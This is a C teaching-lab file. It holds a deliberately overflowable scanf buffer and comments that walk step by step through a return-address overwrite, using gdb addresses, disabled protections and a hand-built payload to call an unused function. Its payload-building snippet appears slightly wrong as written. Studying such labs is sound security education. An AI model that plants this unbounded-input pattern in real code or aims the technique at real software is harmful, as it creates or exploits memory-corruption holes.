#include <stdio.h>
#include <stdlib.h>

void lonely()
{
    puts("nobody ever calls me...\n");
}

int main()
{
    char buf[8];
    scanf("%s",buf);
    printf("you entered %s\n",buf);
    return 0;
}

// normally lonely wouldn't be called, but we can attempt to modify the return address 
// from main via some input to call lonely instead

// compile
// gcc -g -fno-stack-protector -z execstack lab.c -o lab

// start gdb with lab
// gdb ./lab

// b main
// run

// info frame
// here the rip is the where the return address(saved rip) is stored
// in my case rip is
// 0x7fffffffd848

// we want the return address of main to instead be the address of lonely
// what is the address of lonely?
// we can find this by just printing lonely

// print lonely

// in my case it's
// 0x555555555189

// so our goal here is to change return address of main ( address stored in 0x7fffffffd848 )
// to be address of lonely ( 0x555555555189 )

// how can we edit return address?
// we'll use buffer
// buf is meant to store strings of 7 characters + null terminator (8 bytes)
// but scanf doesn't account for this limit, it just keeps taking in input
// with this we can edit specific memory addresses... so we can intentionally give it
// too much input
// so it specifically overwrites the return address with
// our target address

// figure out the address of buf
// buf is already in scope, at this point
// so just print &buf to get its address

// print &buf

// in my case it's
// 0x7fffffffd838

// storage location of return address main : 0x7fffffffd848
// buf address : 0x7fffffffd838
// lonely address : 0x555555555189

// find the difference between buf address and return address storage(offset)
// so we know how many bytes are needed to overwrite return address

// offset = return address - buf address
// offset = 0x7fffffffd848 - 0x7fffffffd838
// offset = 0x10

// so we need 16 bytes to overwrite return address

// we'll make a .bin file with our attack string
// need 16 bytes of whatever, and then the address of lonely
// in little endian format so that it's stored correctly in the return address location

/*
(
    printf("1234567890123456")

    printf("\x89\x51\x55\x55\x55\x55\x00\x00") > exploit.bin
)


*/

// now run it with our exploit input
// setarch -R ./lab < exploit.bin

// we do get lonely called correctly which is nice, but we do notice segmentation fault

// why does this happen?

// -> return address gets overwritten, and becomes junk
// so after runnign lonely, function tries to return to that address but that address is garbage